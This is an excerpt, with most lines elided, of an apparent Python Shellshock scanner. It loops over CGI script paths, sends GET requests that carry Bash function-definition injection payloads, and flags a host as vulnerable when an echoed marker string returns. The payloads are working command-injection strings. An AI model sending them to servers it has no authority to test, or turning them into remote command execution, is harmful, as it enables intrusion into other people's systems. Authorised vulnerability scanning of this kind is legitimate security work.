...
for script in scripts:
  ...
  try:
    ...
    if res.status == 200:
      ...
      test1 = sendGet(script, "() { :;}; echo; echo \"Kostia2004\"")
      test2 = sendGet(script, "() { :;}; /bin/bash -c 'echo; echo Kostia2004'")
      if test1.status == 200 and "Kostia2004" in test1.read():
        vlns += 1
        print("    %sWhoa - it's vulnerable!%s\n" %(GREEN, RESET))
      elif test2.status == 200 and "Kostia2004" in test2.read():
        print("    %sWhoa - it's vulnerable!%s\n" %(GREEN, RESET))
        vlns += 1
